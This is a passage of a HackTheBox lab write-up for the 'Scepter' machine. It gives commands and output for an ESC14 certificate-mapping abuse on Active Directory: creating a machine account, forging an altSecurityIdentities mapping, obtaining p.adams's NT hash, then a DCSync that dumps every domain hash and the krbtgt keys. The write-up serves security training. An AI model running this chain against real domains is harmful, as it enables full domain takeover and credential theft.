+<p><code>h.brown</code> has write access to <code>p.adams</code>'s <code>altSecurityIdentities</code> attribute.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> KRB5CCNAME=h.brown.ccache bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -k</span><span> get writable</span><span style="color:#bf616a;"> --detail
+</span><span>
+</span><span style="color:#bf616a;">distinguishedName:</span><span> CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
+</span><span style="color:#bf616a;">altSecurityIdentities:</span><span> WRITE
+</span><span>
+</span></code></pre>
+<p>Also <code>h.brown</code> user has <code>SeMachineAccountPrivilege</code> , so <code>h.brown</code> can add machine account into AD environment.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">*Evil-WinRM*</span><span> PS C:</span><span style="color:#96b5b4;">\U</span><span>sers</span><span style="color:#96b5b4;">\h</span><span>.brown</span><span style="color:#96b5b4;">\a</span><span>ppdata&gt; whoami /priv
+</span><span>
+</span><span style="color:#bf616a;">PRIVILEGES</span><span> INFORMATION
+</span><span style="color:#bf616a;">----------------------
+</span><span>
+</span><span style="color:#bf616a;">Privilege</span><span> Name                Description                    State
+</span><span>=</span><span style="color:#a3be8c;">============================ </span><span>=</span><span style="color:#a3be8c;">============================= </span><span>=</span><span style="color:#a3be8c;">======
+</span><span style="color:#bf616a;">SeMachineAccountPrivilege</span><span>     Add workstations to domain     Enabled
+</span><span style="color:#bf616a;">SeChangeNotifyPrivilege</span><span>       Bypass traverse checking       Enabled
+</span><span style="color:#bf616a;">SeIncreaseWorkingSetPrivilege</span><span> Increase a process working set Enabled
+</span><span style="color:#bf616a;">*Evil-WinRM*</span><span> PS C:</span><span style="color:#96b5b4;">\U</span><span>sers</span><span style="color:#96b5b4;">\h</span><span>.brown</span><span style="color:#96b5b4;">\a</span><span>ppdata&gt; 
+</span></code></pre>
+<h3 id="chaining-the-attack-path">Chaining the Attack Path</h3>
+<p>I'm already aware of  <a href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#helpdesk-enrollment-certificate-ou">bloodhound analysis</a> <code>domain computers</code> has enrollment rights on <code>HeldeskEnrollmentCertificate</code> template . <code>h.brown</code> has privilege to add domain computers into AD environment and has write rights <code>altSecurityIdentities</code> on <code>p.adams</code> .</p>
+<p>The attack path explained <a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities">ESC14 A</a></p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718164302.png" alt="" /></p>
+<h5 id="1-first-create-machine-account">1. first create machine account.</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]                                 
+</span><span style="color:#bf616a;">└─#</span><span> bloodyAD</span><span style="color:#bf616a;"> -d</span><span> scepter.htb</span><span style="color:#bf616a;"> --dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u</span><span> a.carter</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123.!</span><span>&#39; add computer ggwp &#39;</span><span style="color:#a3be8c;">Password123</span><span>&#39;                                                                                         
+</span><span style="color:#bf616a;">[+]</span><span> ggwp created 
+</span></code></pre>
+<h5 id="2-ask-certificate-via-machine">2. Ask certificate via machine.</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy req</span><span style="color:#bf616a;"> -ca </span><span>&#39;</span><span style="color:#a3be8c;">scepter-DC01-CA</span><span>&#39;</span><span style="color:#bf616a;"> -target</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -u </span><span>&#39;</span><span style="color:#a3be8c;">ggwp$</span><span>&#39;</span><span style="color:#bf616a;"> -p </span><span>&#39;</span><span style="color:#a3be8c;">Password123</span><span>&#39;</span><span style="color:#bf616a;"> -template </span><span>&#39;</span><span style="color:#a3be8c;">Machine</span><span>&#39;
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Requesting certificate via RPC
+</span><span style="color:#bf616a;">[*]</span><span> Request ID is 28
+</span><span style="color:#bf616a;">[*]</span><span> Successfully requested certificate
+</span><span style="color:#bf616a;">[*]</span><span> Got certificate with DNS Host Name &#39;</span><span style="color:#a3be8c;">ggwp.scepter.htb</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Certificate object SID is &#39;</span><span style="color:#a3be8c;">S-1-5-21-74879546-916818434-740295365-9108</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Saving certificate and private key to &#39;</span><span style="color:#a3be8c;">ggwp.pfx</span><span>&#39;
+</span><span style="color:#bf616a;">File </span><span>&#39;</span><span style="color:#a3be8c;">ggwp.pfx</span><span>&#39; already exists. Overwrite? (y/n - saying no will save with a unique filename)</span><span style="color:#96b5b4;">:</span><span> y
+</span><span style="color:#bf616a;">[*]</span><span> Wrote certificate and private key to &#39;</span><span style="color:#a3be8c;">ggwp.pfx</span><span>&#39;
+</span></code></pre>
+<h6 id="3-and-than-extract-serial-number-and-issuer-values-from-certificate">3. and than extract serial number and issuer values from certificate</h6>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy cert</span><span style="color:#bf616a;"> -pfx</span><span> ggwp.pfx</span><span style="color:#bf616a;"> -nokey -out</span><span> ggwp.crt                                    
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Data written to &#39;</span><span style="color:#a3be8c;">ggwp.crt</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Writing certificate to &#39;</span><span style="color:#a3be8c;">ggwp.crt</span><span>&#39;
+</span><span>
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">issuer</span><span>=</span><span style="color:#a3be8c;">DC=htb, </span><span style="color:#bf616a;">DC</span><span>=</span><span style="color:#a3be8c;">scepter, </span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">scepter-DC01-CA
+</span><span style="color:#bf616a;">serial</span><span>=</span><span style="color:#a3be8c;">620000001C2F55D7F04D35E78400000000001C
+</span><span>                                                                                                   
+</span><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> openssl x509</span><span style="color:#bf616a;"> -noout -text -issuer -serial -in</span><span> ggwp.crt
+</span><span>
+</span></code></pre>
+<h5 id="4-add-p-adams-in-altsecurityidentities-attribute-with-add-altsecidmapping-ps1">4. Add p.adams'in altSecurityIdentities attribute with Add-AltSecIDMapping.ps1.</h5>
+<p>with Get-AltSecIDMapping.ps1 we check we wrote properly or not.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">PS</span><span> C:</span><span style="color:#96b5b4;">\t</span><span>emp&gt; Add-AltSecIDMapping</span><span style="color:#bf616a;"> -DistinguishedName </span><span>&quot;</span><span style="color:#a3be8c;">CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB</span><span>&quot;</span><span style="color:#bf616a;"> -MappingString </span><span>&quot;</span><span style="color:#a3be8c;">X509:&lt;I&gt;DC=htb,DC=scepter,CN=scepter-DC01-CA&lt;SR&gt;1C000000000084E7354DF0D7552F1C00000062</span><span>&quot;
+</span><span style="color:#bf616a;">Add-AltSecIDMapping -DistinguishedName </span><span>&quot;</span><span style="color:#a3be8c;">CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB</span><span>&quot;</span><span style="color:#bf616a;"> -MappingString </span><span>&quot;</span><span style="color:#a3be8c;">X509:&lt;I&gt;DC=htb,DC=scepter,CN=scepter-DC01-CA&lt;SR&gt;1C000000000084E7354DF0D7552F1C00000062</span><span>&quot;
+</span><span>
+</span><span>
+</span><span style="color:#bf616a;">PS</span><span> C:</span><span style="color:#96b5b4;">\t</span><span>emp&gt; Get-AltSecIDMapping</span><span style="color:#bf616a;"> -SearchBase </span><span>&quot;</span><span style="color:#a3be8c;">CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB</span><span>&quot;
+</span><span style="color:#bf616a;">Get-AltSecIDMapping -SearchBase </span><span>&quot;</span><span style="color:#a3be8c;">CN=P.ADAMS,OU=HELPDESK ENROLLMENT CERTIFICATE,DC=SCEPTER,DC=HTB</span><span>&quot;
+</span><span>
+</span><span style="color:#bf616a;">CN</span><span>=</span><span style="color:#a3be8c;">p.adams,OU=Helpdesk </span><span style="color:#bf616a;">Enrollment</span><span> Certificate,DC=scepter,DC=htb
+</span><span style="color:#bf616a;">X509:</span><span style="color:#a3be8c;">&lt;I&gt;DC=htb,DC=scepter,CN=scepter-DC01-CA</span><span>&lt;SR&gt;</span><span style="color:#d08770;">1</span><span style="color:#bf616a;">C000000000084E7354DF0D7552F1C00000062
+</span><span style="color:#bf616a;">PS</span><span> C:</span><span style="color:#96b5b4;">\t</span><span>emp&gt; 
+</span><span>
+</span></code></pre>
+<h5 id="5-get-certificate-of-p-adams-with-ggwp-machine-account">5. Get certificate of p.adams with ggwp machine account</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy auth</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65</span><span style="color:#bf616a;"> -pfx</span><span> ggwp.pfx</span><span style="color:#bf616a;"> -username</span><span> p.adams
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.2 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Certificate identities:
+</span><span style="color:#bf616a;">[*]</span><span>     SAN DNS Host Name: &#39;</span><span style="color:#a3be8c;">ggwp.scepter.htb</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span>     Security Extension SID: &#39;</span><span style="color:#a3be8c;">S-1-5-21-74879546-916818434-740295365-9108</span><span>&#39;
+</span><span style="color:#bf616a;">[!]</span><span> The provided username does not match the identity found in the certificate: &#39;</span><span style="color:#a3be8c;">p.adams</span><span>&#39; - &#39;</span><span style="color:#a3be8c;">ggwp$</span><span>&#39;
+</span><span style="color:#bf616a;">Do</span><span> you want to continue? (Y/n)</span><span style="color:#96b5b4;">:</span><span> Y
+</span><span style="color:#bf616a;">[*]</span><span> Using principal: &#39;</span><span style="color:#a3be8c;">p.adams@scepter.htb</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Trying to get TGT...
+</span><span style="color:#bf616a;">[*]</span><span> Got TGT
+</span><span style="color:#bf616a;">[*]</span><span> Saving credential cache to &#39;</span><span style="color:#a3be8c;">p.adams.ccache</span><span>&#39;
+</span><span style="color:#bf616a;">File </span><span>&#39;</span><span style="color:#a3be8c;">p.adams.ccache</span><span>&#39; already exists. Overwrite? (y/n - saying no will save with a unique filename)</span><span style="color:#96b5b4;">:</span><span> y
+</span><span style="color:#bf616a;">[*]</span><span> Wrote credential cache to &#39;</span><span style="color:#a3be8c;">p.adams.ccache</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Trying to retrieve NT hash for &#39;</span><span style="color:#a3be8c;">p.adams</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Got hash for &#39;</span><span style="color:#a3be8c;">p.adams@scepter.htb</span><span>&#39;: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
+</span></code></pre>
+<h5 id="proof">proof</h5>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> nxc smb dc01.scepter.htb</span><span style="color:#bf616a;"> -u</span><span> p.adams</span><span style="color:#bf616a;"> -H </span><span>&#39;</span><span style="color:#a3be8c;">1b925c524f447bb821a8789c4b118ce0</span><span>&#39;
+</span><span style="color:#bf616a;">SMB</span><span>         10.10.11.65     445    DC01             </span><span style="color:#b48ead;">[</span><span>*</span><span style="color:#b48ead;">]</span><span> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (</span><span style="color:#bf616a;">domain:scepter.htb</span><span>) (signing:True) (</span><span style="color:#bf616a;">SMBv1:False</span><span>)
+</span><span style="color:#bf616a;">SMB</span><span>         10.10.11.65     445    DC01             </span><span style="color:#b48ead;">[</span><span>+</span><span style="color:#b48ead;">]</span><span> scepter.htb</span><span style="color:#96b5b4;">\p</span><span>.adams:1b925c524f447bb821a8789c4b118ce0
+</span></code></pre>
+<h2 id="dcsync-on-dc01-scepter-htb">DCSync on dc01.scepter.htb</h2>
+<blockquote>
+<blockquote>
+<p>The <strong>DCSync attack</strong> is a post-exploitation technique where an attacker simulates the behavior of a Domain Controller (DC) to request password hashes and secrets from another DC via <strong>replication protocols</strong>. By abusing permissions like <strong>Replicating Directory Changes</strong> and <strong>Replicating Directory Changes All</strong>, the attacker can use tools like Mimikatz to retrieve NTLM hashes, Kerberos keys, and even the <strong>KRBTGT account hash</strong>, which can be used to forge Golden Tickets. This technique does not require code execution on the Domain Controller itself—only the right privileges on an account—making it stealthy and powerful for gaining full domain persistence.</p>
+</blockquote>
+</blockquote>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718164455.png" alt="" /></p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> impacket-secretsdump</span><span style="color:#bf616a;"> -dc-ip</span><span> 10.10.11.65 scepter.htb/p.adams@dc01.scepter.htb</span><span style="color:#bf616a;"> -hashes </span><span>&#39;</span><span style="color:#a3be8c;">:1b925c524f447bb821a8789c4b118ce0</span><span>&#39;</span><span style="color:#bf616a;"> -just-dc
+</span><span style="color:#bf616a;">Impacket</span><span> v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Dumping Domain Credentials (domain</span><span style="color:#96b5b4;">\u</span><span>id:rid:lmhash:nthash)
+</span><span style="color:#bf616a;">[*]</span><span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span><span style="color:#bf616a;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
+</span><span style="color:#bf616a;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span style="color:#bf616a;">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
+</span><span style="color:#bf616a;">d.baker</span><span style="color:#96b5b4;">\d</span><span style="color:#bf616a;">.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\a</span><span style="color:#bf616a;">.carter:1107:aad3b435b51404eeaad3b435b51404ee:2e24650b1e4f376fa574da438078d200:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\h</span><span style="color:#bf616a;">.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\p</span><span style="color:#bf616a;">.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\e</span><span style="color:#bf616a;">.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\o</span><span style="color:#bf616a;">.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\M</span><span style="color:#bf616a;">.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
+</span><span style="color:#bf616a;">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
+</span><span style="color:#bf616a;">[*]</span><span> Kerberos keys grabbed
+</span><span style="color:#bf616a;">Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
+</span><span style="color:#bf616a;">Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
+</span><span style="color:#bf616a;">Administrator:des-cbc-md5:f79d45bf688aa238
+</span><span style="color:#bf616a;">krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
+</span><span style="color:#bf616a;">krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
+</span><span style="color:#bf616a;">krbtgt:des-cbc-md5:57f8ef4f4c7f6245
+</span><span style="color:#bf616a;">d.baker</span><span style="color:#96b5b4;">\d</span><span style="color:#bf616a;">.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
+</span><span style="color:#bf616a;">d.baker</span><span style="color:#96b5b4;">\d</span><span style="color:#bf616a;">.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
+</span><span style="color:#bf616a;">d.baker</span><span style="color:#96b5b4;">\d</span><span style="color:#bf616a;">.baker:des-cbc-md5:2fce8a3426c8c2c1
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\a</span><span style="color:#bf616a;">.carter:aes256-cts-hmac-sha1-96:5a793dad7f782356cb6a741fe73ddd650ca054870f0c6d70fadcae162a389a71
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\a</span><span style="color:#bf616a;">.carter:aes128-cts-hmac-sha1-96:f7643849c000f5a7a6bd5c88c4724afd
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\a</span><span style="color:#bf616a;">.carter:des-cbc-md5:d607b098cb5e679b
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\h</span><span style="color:#bf616a;">.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\h</span><span style="color:#bf616a;">.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\h</span><span style="color:#bf616a;">.brown:des-cbc-md5:6e6dd30151cb58c7
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\p</span><span style="color:#bf616a;">.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\p</span><span style="color:#bf616a;">.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\p</span><span style="color:#bf616a;">.adams:des-cbc-md5:f7a26e794949fd61
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\e</span><span style="color:#bf616a;">.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\e</span><span style="color:#bf616a;">.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\e</span><span style="color:#bf616a;">.lewis:des-cbc-md5:57e9291aad91fe7f
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\o</span><span style="color:#bf616a;">.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\o</span><span style="color:#bf616a;">.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\o</span><span style="color:#bf616a;">.scott:des-cbc-md5:e329e37fda6e0df7
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\M</span><span style="color:#bf616a;">.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\M</span><span style="color:#bf616a;">.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
+</span><span style="color:#bf616a;">scepter.htb</span><span style="color:#96b5b4;">\M</span><span style="color:#bf616a;">.clark:des-cbc-md5:4c7f5dfbdcadba94
+</span><span style="color:#bf616a;">DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
+</span><span style="color:#bf616a;">DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
+</span><span style="color:#bf616a;">DC01$:des-cbc-md5:d6923e61a83d51ef
+</span><span style="color:#bf616a;">[*]</span><span> Cleaning up...
+</span></code></pre>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-mirage/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>HackTheBox Mirage Writeup</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop/" accesskey="."
+    ><span>SmileyCTF Babyrop Writeup 1</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  mediumZoom('img:not(.no-zoom)', {
+    margin: 24,
+    background: 'rgba(0, 0, 0, 0.9)',
+    scrollOffset: 40,
+  });
+</script>
+<!-- Only runs if .encrypted-content exists -->
+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function showDecryptionUI(block) {
+      block.innerHTML = `<div style="padding: 1rem; border: 1px solid #444; border-radius: 8px; background: #1e1e1e;">
+  <label style="display:block; margin-bottom:0.8rem; font-weight:600; font-size:1.1rem; color:#f5f5f5;">
+    🔒 This content is password-protected:
+  </label>
+  <div style="display: flex; align-items: center; gap: 0.75rem;">
+    <input type="password" id="decrypt-password" placeholder="Enter password"
+           style="flex: 1; padding: 0.6rem 0.8rem; font-size: 1rem; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px;">
+    <button id="decrypt-button"
+            style="padding: 0.6rem 1rem; background: #2d2d2d; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+      Decrypt
+    </button>
+    <div style="display: flex; align-items: center;">
+      <input type="checkbox" id="show-pw" style="margin-left: 0.4rem; cursor: pointer;">
+      <label for="show-pw" title="Show password" style="margin-left: 0.4rem; font-size: 1.2rem; cursor: pointer;">👁️</label>
+    </div>
+  </div>
+  <div id="decrypt-error" style="color: #ff6b6b; margin-top: 0.75rem;"></div>
+</div>
+`;
+      var input = block.querySelector('input[type="password"]');
+      var button = block.querySelector('button');
+      var error = block.querySelector('#decrypt-error');
+      var showPw = block.querySelector('#show-pw');
+      showPw.onchange = function () {
+        input.type = this.checked ? 'text' : 'password';
+      };
+      button.onclick = function () {
+        var password = input.value;
+        var ciphertext_b64 = block.getAttribute('data-encrypted');
+        try {
+          var ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64);
+          var iv = CryptoJS.lib.WordArray.create(ciphertext.words.slice(0, 4), 16);
+          var actualCiphertext = CryptoJS.lib.WordArray.create(ciphertext.words.slice(4), ciphertext.sigBytes - 16);
+          var key = CryptoJS.SHA256(password);
+          var bytes = CryptoJS.AES.decrypt({ ciphertext: actualCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+          var plaintext = bytes.toString(CryptoJS.enc.Utf8);
+          if (!plaintext) throw new Error('Incorrect password or corrupt data');
+
+          plaintext = plaintext.replace(/!\[\[(.*?)\]\]/g, (match, p1) => {
+            const src = p1.match(/^\//) ? p1 : '/assets/images/' + p1;
+            return `![](${src})`;
+          });
+          plaintext = plaintext.replace(/\[\[(.*?)\]\]/g, (match, p1) => {
+            const href = '/' + p1.trim().replace(/\s+/g, '-').toLowerCase();
+            return `[${p1}](${href})`;
+          });
+          plaintext = plaintext.replace(/!\[\]\((data:image\/[^)]+)\)/g, (match, dataUri) => {
+            return `<img src="${dataUri}" style="max-width:100%; border-radius:8px; margin:1rem 0;">`;
+          });
+
+          if (window.marked) {
+            block.innerHTML = '<div class="post-content">' + marked.parse(plaintext) + '</div>';
+          } else {
+            block.innerHTML = '<pre>' + plaintext + '</pre>';
+            return;
+          }
+          
+          mediumZoom('img:not(.no-zoom)', {
+          margin: 24,
+          background: 'rgba(0, 0, 0, 0.9)',
+          scrollOffset: 40,
+          });
+
+          // ▼▼▼ Inject TOC based on headings ▼▼▼
+          const tocContainer = document.createElement('nav');
+          tocContainer.className = 'toc';
+          const headers = block.querySelectorAll('.post-content h1, .post-content h2, .post-content h3');
+          if (headers.length > 0) {
+            const tocList = document.createElement('ul');
+            headers.forEach(h => {
+              if (!h.id) {
+                h.id = h.textContent.trim().toLowerCase().replace(/\s+/g, '-');
+              }
+              const li = document.createElement('li');
+              li.style.marginLeft = h.tagName === 'H3' ? '1.2em' : h.tagName === 'H2' ? '0.6em' : '0';
+              const a = document.createElement('a');
+              a.href = '#' + h.id;
+              a.textContent = h.textContent;
+              li.appendChild(a);
+              tocList.appendChild(li);
+            });
+            tocContainer.innerHTML = `<strong style="display:block;margin-bottom:0.5em;">▼ Table of Contents</strong>`;
+            tocContainer.appendChild(tocList);
+            block.prepend(tocContainer);
+          }
+          // ▲▲▲ TOC Injection End ▲▲▲
+
+        } catch (e) {
+          let msg = e.message?.match(/utf-?8/i) ? 'Decryption failed' : '❌ ' + (e.message || 'Incorrect password or corrupt data');
+          error.textContent = msg;
+          error.style.display = 'block';
+        }
+      };
+    }
+
+    document.querySelectorAll('.encrypted-content').forEach(showDecryptionUI);
+  });
+</script>
+
+<!-- Share page -->
+<br>
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
